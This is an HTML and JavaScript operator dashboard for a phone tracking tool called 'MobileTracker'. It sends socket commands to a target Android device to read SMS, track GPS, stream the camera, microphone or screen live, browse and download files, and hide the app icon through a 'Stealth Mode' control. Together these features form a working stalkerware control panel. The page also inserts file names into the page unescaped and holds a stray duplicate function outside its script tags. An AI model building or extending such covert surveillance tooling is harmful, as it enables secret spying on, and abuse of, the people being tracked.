<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MobileTracker Master Dashboard</title>
    <script src="/socket.io/socket.io.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --sidebar-bg: #2c3e50; --teal: #1abc9c; --blue: #3498db; --red: #e74c3c;
            --win-bg: #ffffff; --win-hover: #e5f3ff; --win-border: #d9d9d9;
        }
        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; background: #f4f7f6; overflow: hidden; }
        
        /* Sidebar */
        .sidebar { width: 240px; background: var(--sidebar-bg); color: white; flex-shrink: 0; display: flex; flex-direction: column; }
        .sidebar-header { padding: 20px; background: #1a252f; font-weight: bold; font-size: 1.1rem; }
        .nav-item { padding: 12px 20px; display: flex; align-items: center; color: #bdc3c7; cursor: pointer; border-left: 4px solid transparent; }
        .nav-item:hover, .nav-item.active { background: #3e5871; color: white; border-left: 4px solid var(--teal); }
        .nav-item i { margin-right: 15px; width: 20px; text-align: center; }

        .main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        .content { flex: 1; padding: 20px; overflow-y: auto; }

        /* Status Bar (Battery, GPS, Stealth) */
        .status-row { display: flex; gap: 15px; margin-bottom: 25px; }
        .tile { background: white; flex: 1; border-radius: 4px; display: flex; box-shadow: 0 1px 3px rgba(0,0,0,0.1); overflow: hidden; }
        .tile-icon { width: 60px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; color: #fff; }
        .tile-body { padding: 10px; flex: 1; }
        .tile-body label { display: block; font-size: 0.7rem; font-weight: bold; color: #7f8c8d; text-transform: uppercase; }
        .tile-body span { font-size: 1rem; color: #333; }

        /* Windows Explorer Style */
        .explorer-container { background: white; border: 1px solid var(--win-border); display: flex; flex-direction: column; height: 85%; border-radius: 4px; }
        .explorer-toolbar { padding: 10px; background: #f5f5f5; border-bottom: 1px solid var(--win-border); display: flex; gap: 10px; }
        .address-bar { flex: 1; background: white; border: 1px solid #ccc; padding: 5px 10px; font-size: 0.9rem; display: flex; align-items: center; }
        .explorer-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; padding: 20px; overflow-y: auto; }
        .file-item { text-align: center; padding: 10px; cursor: pointer; border-radius: 3px; border: 1px solid transparent; }
        .file-item:hover { background: var(--win-hover); border: 1px solid #cce8ff; }
        .file-item i { font-size: 2.5rem; display: block; margin-bottom: 8px; }
        .icon-folder { color: #ffca28; }
        .icon-file { color: #78909c; }

        /* Floating 30 FPS Live View Window */
        .video-overlay {
            display: none; position: fixed; bottom: 20px; right: 20px;
            width: 420px; background: #000; border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.6); z-index: 9999; border: 1px solid #444;
        }
        .video-header { padding: 10px; background: #222; color: #fff; display: flex; justify-content: space-between; border-radius: 8px 8px 0 0; }
        .video-body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 250px; }
        #stream-feed { max-width: 100%; max-height: 500px; display: block; }
        .video-footer { padding: 12px; text-align: center; background: #222; border-radius: 0 0 8px 8px; }

        /* Controls */
        .live-panel { background: white; padding: 30px; border-radius: 4px; }
        .mode-selector { display: flex; justify-content: center; gap: 20px; margin-bottom: 25px; }
        .mode-box { border: 1px solid #ddd; padding: 15px; width: 80px; text-align: center; cursor: pointer; position: relative; border-radius: 4px; }
        .mode-box.selected { border-color: var(--blue); background: #ebf5fb; }
        .mode-box.selected .check { display: block; position: absolute; top: 2px; right: 2px; color: var(--blue); }
        .check { display: none; }
        select, .btn-main { width: 280px; padding: 12px; margin: 10px auto; display: block; border-radius: 4px; border: 1px solid #ccc; font-weight: bold; }
        .btn-main { background: var(--red); color: white; cursor: pointer; border: none; }
    </style>
</head>
<body>
function startLive() {
    let cmd = "";
    if (currentMode === 'screen') {
        // This command should trigger the service to launch ScreenCaptureActivity
        cmd = "request-screen-permission"; 
    } else {
        cmd = `stream:${document.getElementById('cam-id').value}:${document.getElementById('aud-id').value === 'yes' ? 'audio-video' : 'video'}`;
    }
    sendCmd(cmd);
    document.getElementById('video-overlay').style.display = 'block';
}
    <div class="sidebar">
        <div class="sidebar-header">MobileTracker <span style="font-weight:300">free</span></div>
        <div class="nav-item active" onclick="showTab('dashboard')"><i class="fa fa-home"></i> Dashboard</div>
        <div class="nav-item" onclick="sendCmd('get-sms')"><i class="fa fa-envelope"></i> SMS Logs</div>
        <div class="nav-item" onclick="showTab('live')"><i class="fa fa-video"></i> Live Viewing</div>
        <div class="nav-item" onclick="showTab('explorer')"><i class="fa fa-folder-open"></i> Windows Explorer</div>
        <div class="nav-item" onclick="sendCmd('hide-icon')" style="color:#f39c12; margin-top: auto;"><i class="fa fa-user-secret"></i> Stealth Mode</div>
    </div>

    <div class="main">
        <div class="top-bar"><strong>Status: <span id="conn-status" style="color:var(--teal)">Connected</span> | Device: RMX2020</strong></div>

        <div class="content">
            <div class="status-row">
                <div class="tile"><div class="tile-icon" style="background:#bdc3c7"><i class="fa fa-signal"></i></div><div class="tile-body"><label>Network</label><span>Online</span></div></div>
                <div class="tile"><div class="tile-icon" style="background:var(--red)"><i class="fa fa-battery-half"></i></div><div class="tile-body" style="background:var(--red); color:white"><label style="color:white">Battery</label><span id="batt">-- %</span></div></div>
                <div class="tile" style="flex:2"><div class="tile-icon" style="background:var(--blue)"><i class="fa fa-map-marker-alt"></i></div><div class="tile-body" style="background:var(--blue); color:white"><label style="color:white">Location</label><span id="gps">Waiting for GPS...</span></div></div>
            </div>

            <div id="tab-dashboard">
                <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:15px;">
                    <div style="background:var(--blue); padding:20px; color:white; border-radius:4px; position:relative;">
                        <i class="fa fa-envelope" style="font-size:3rem; opacity:0.2;"></i>
                        <div id="sms-count" style="font-size:2rem; position:absolute; right:20px; top:10px;">0</div>
                        <div style="margin-top:20px; font-weight:bold;">SMS DATA</div>
                    </div>
                </div>
            </div>

            <div id="tab-live" class="live-panel" style="display:none">
                <div class="mode-selector">
                    <div class="mode-box selected" onclick="setMode('video', this)"><i class="fa fa-video" style="color:orange"></i><div class="check"><i class="fa fa-check-circle"></i></div><div style="font-size:0.6rem">VIDEO</div></div>
                    <div class="mode-box" onclick="setMode('audio', this)"><i class="fa fa-microphone" style="color:purple"></i><div class="check"><i class="fa fa-check-circle"></i></div><div style="font-size:0.6rem">AUDIO</div></div>
                    <div class="mode-box" onclick="setMode('screen', this)"><i class="fa fa-desktop" style="color:red"></i><div class="check"><i class="fa fa-check-circle"></i></div><div style="font-size:0.6rem">SCREEN</div></div>
                </div>
                <div id="video-ctrls">
                    <select id="cam-id"><option value="0">Rear Camera (Default)</option><option value="1">Front Camera</option></select>
                    <select id="aud-id"><option value="no">No Sound</option><option value="yes">With Audio</option></select>
                </div>
                <button class="btn-main" id="start-btn" onclick="startLive()">START LIVE STREAM</button>
            </div>

            <div id="tab-explorer" style="display:none; height: 100%;">
                <div class="explorer-container">
                    <div class="explorer-toolbar">
                        <button onclick="sendCmd('get-files')"><i class="fa fa-sync"></i> Refresh Files</button>
                        <div class="address-bar"><i class="fa fa-folder-open" style="color:#ffca28; margin-right:8px;"></i> <span id="path">/storage/emulated/0</span></div>
                    </div>
                    <div class="explorer-grid" id="explorer-grid"></div>
                </div>
            </div>
        </div>
    </div>

    <div id="video-overlay" class="video-overlay">
        <div class="video-header"><span id="stream-title">Live Camera</span><i class="fa fa-times" onclick="stopLive()" style="cursor:pointer"></i></div>
        <div class="video-body"><img id="stream-feed" src="" alt="Stream Loading..."></div>
        <div class="video-footer"><button style="background:var(--red); border:none; color:white; padding:8px 20px; border-radius:4px; cursor:pointer;" onclick="stopLive()">STOP STREAM</button></div>
    </div>

    <script>
        const socket = io();
        let currentMode = 'video';

        function sendCmd(c) { socket.emit('phone-execute', c); }
        function showTab(t) {
            ['dashboard', 'live', 'explorer'].forEach(id => document.getElementById('tab-'+id).style.display = (id===t?'block':'none'));
            if(t==='dashboard') document.getElementById('tab-dashboard').style.display = 'block';
        }

        function setMode(m, el) {
            currentMode = m;
            document.querySelectorAll('.mode-box').forEach(b => b.classList.remove('selected'));
            el.classList.add('selected');
            document.getElementById('video-ctrls').style.display = (m==='video' ? 'block' : 'none');
            document.getElementById('stream-title').innerText = m.toUpperCase() + " STREAM";
        }

        function startLive() {
            let cmd = "";
            if (currentMode === 'video') {
                cmd = `stream:${document.getElementById('cam-id').value}:${document.getElementById('aud-id').value === 'yes' ? 'audio-video' : 'video'}`;
            } else {
                cmd = `stream:0:${currentMode}`;
            }
            sendCmd(cmd);
            document.getElementById('video-overlay').style.display = 'block';
        }

        function stopLive() {
            sendCmd('stop-stream');
            document.getElementById('video-overlay').style.display = 'none';
            document.getElementById('stream-feed').src = "";
        }

        // UPDATED: Screen/Video Frames
        socket.on('data-stream', (base64) => {
            document.getElementById('stream-feed').src = "data:image/jpeg;base64," + base64;
        });

        // Other Listeners
        socket.on('battery-update', (v) => { document.getElementById('batt').innerText = v + " %"; });
        socket.on('location-update', (d) => { document.getElementById('gps').innerText = d.lat + ", " + d.lng; });
        socket.on('sms-data', (d) => { document.getElementById('sms-count').innerText = JSON.parse(d).length; });

        // Explorer Logic
        socket.on('file-data', (data) => {
            const files = JSON.parse(data);
            const grid = document.getElementById('explorer-grid');
            grid.innerHTML = files.map(f => `
                <div class="file-item" onclick="${f.d ? '' : `sendCmd('download:${f.n}')`}">
                    <i class="fa ${f.d ? 'fa-folder icon-folder' : 'fa-file-alt icon-file'}"></i>
                    <span>${f.n}</span>
                </div>
            `).join('');
        });
    </script>
</body>
</html>

